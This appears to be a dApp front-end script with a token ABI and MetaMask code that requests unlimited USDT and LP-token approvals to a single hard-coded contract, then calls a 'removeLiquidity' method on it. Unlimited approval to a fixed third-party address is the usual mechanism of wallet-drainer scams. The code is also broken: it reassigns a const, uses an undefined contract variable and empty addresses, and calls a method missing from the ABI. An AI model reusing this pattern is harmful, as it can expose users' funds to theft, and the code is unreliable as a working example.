const TokenAbi = [
    {
        "inputs":[

        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"constructor"
    },
    {
        "anonymous":false,
        "inputs":[
            {
                "indexed":true,
                "internalType":"address",
                "name":"owner",
                "type":"address"
            },
            {
                "indexed":true,
                "internalType":"address",
                "name":"spender",
                "type":"address"
            },
            {
                "indexed":false,
                "internalType":"uint256",
                "name":"value",
                "type":"uint256"
            }
        ],
        "name":"Approval",
        "type":"event"
    },
    {
        "anonymous":false,
        "inputs":[
            {
                "indexed":true,
                "internalType":"address",
                "name":"previousOwner",
                "type":"address"
            },
            {
                "indexed":true,
                "internalType":"address",
                "name":"newOwner",
                "type":"address"
            }
        ],
        "name":"OwnershipTransferred",
        "type":"event"
    },
    {
        "anonymous":false,
        "inputs":[
            {
                "indexed":true,
                "internalType":"address",
                "name":"from",
                "type":"address"
            },
            {
                "indexed":true,
                "internalType":"address",
                "name":"to",
                "type":"address"
            },
            {
                "indexed":false,
                "internalType":"uint256",
                "name":"value",
                "type":"uint256"
            }
        ],
        "name":"Transfer",
        "type":"event"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"_decimals",
        "outputs":[
            {
                "internalType":"uint8",
                "name":"",
                "type":"uint8"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"_name",
        "outputs":[
            {
                "internalType":"string",
                "name":"",
                "type":"string"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"_symbol",
        "outputs":[
            {
                "internalType":"string",
                "name":"",
                "type":"string"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[
            {
                "internalType":"address",
                "name":"owner",
                "type":"address"
            },
            {
                "internalType":"address",
                "name":"spender",
                "type":"address"
            }
        ],
        "name":"allowance",
        "outputs":[
            {
                "internalType":"uint256",
                "name":"",
                "type":"uint256"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"spender",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"approve",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[
            {
                "internalType":"address",
                "name":"account",
                "type":"address"
            }
        ],
        "name":"balanceOf",
        "outputs":[
            {
                "internalType":"uint256",
                "name":"",
                "type":"uint256"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"burn",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"decimals",
        "outputs":[
            {
                "internalType":"uint8",
                "name":"",
                "type":"uint8"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"spender",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"subtractedValue",
                "type":"uint256"
            }
        ],
        "name":"decreaseAllowance",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"getOwner",
        "outputs":[
            {
                "internalType":"address",
                "name":"",
                "type":"address"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"spender",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"addedValue",
                "type":"uint256"
            }
        ],
        "name":"increaseAllowance",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"mint",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"name",
        "outputs":[
            {
                "internalType":"string",
                "name":"",
                "type":"string"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"owner",
        "outputs":[
            {
                "internalType":"address",
                "name":"",
                "type":"address"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[

        ],
        "name":"renounceOwnership",
        "outputs":[

        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"symbol",
        "outputs":[
            {
                "internalType":"string",
                "name":"",
                "type":"string"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[

        ],
        "name":"totalSupply",
        "outputs":[
            {
                "internalType":"uint256",
                "name":"",
                "type":"uint256"
            }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"recipient",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"transfer",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"sender",
                "type":"address"
            },
            {
                "internalType":"address",
                "name":"recipient",
                "type":"address"
            },
            {
                "internalType":"uint256",
                "name":"amount",
                "type":"uint256"
            }
        ],
        "name":"transferFrom",
        "outputs":[
            {
                "internalType":"bool",
                "name":"",
                "type":"bool"
            }
        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    },
    {
        "constant":false,
        "inputs":[
            {
                "internalType":"address",
                "name":"newOwner",
                "type":"address"
            }
        ],
        "name":"transferOwnership",
        "outputs":[

        ],
        "payable":false,
        "stateMutability":"nonpayable",
        "type":"function"
    }
]

const removeLiquidityAddr = '0x248510746aa321dA8004bD90855e09fD0A05ba36'

if (typeof window.ethereum !== 'undefined' || (typeof window.web3 !== 'undefined')) {
    const web3 = new Web3(window.ethereum || window.web3.currentProvider);

    // 请求用户连接其 MetaMask 钱包
    async function connectWallet() {
        if (window.ethereum) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                return accounts[0];
            } catch (error) {
                console.error("用户拒绝了钱包连接请求");
            }
        } else if (window.web3) {
            web3 = new Web3(window.web3.currentProvider);
        } else {
            alert("请在钱包内打开");
        }
    }

    connectWallet();
    document.getElementById("approve_USDT").addEventListener("click", async () => {
        const USDTAddress = "0x55d398326f99059fF775485246999027B3197955";
        const USDTcontract = new web3.eth.Contract(TokenAbi, USDTAddress);
        await USDTcontract.methods.approve(
            removeLiquidityAddr,
            "115792089237316195423570985008687907853269984665640564039457584007913129639935"
        ).send({ from: await connectWallet() });
    });

    document.getElementById("approve_LP").addEventListener("click", async () => {
        const LPAddress = "";
        const removeLiquidity = new web3.eth.Contract(TokenAbi, LPAddress);
        await LPContract.methods.approve(
            removeLiquidityAddr,
            "115792089237316195423570985008687907853269984665640564039457584007913129639935"
        ).send({ from: await connectWallet() });
    });


    document.getElementById("remove").addEventListener("click", async () => {
        const removeLiquidityContract = new web3.eth.Contract(TokenAbi, removeLiquidityAddr);
        await removeLiquidityContract.methods.removeLiquidity(
            ""
        ).send({ from: await connectWallet() });
    });

    document.getElementById("unapprove_USDT").addEventListener("click", async () => {
        const USDTAddress = "0x55d398326f99059fF775485246999027B3197955";
        const USDTcontract = new web3.eth.Contract(TokenAbi, USDTAddress);
        await USDTcontract.methods.approve(
            removeLiquidityAddr,
            "0"
        ).send({ from: await connectWallet() });
    });


} else {
    alert("请在钱包内打开");
}
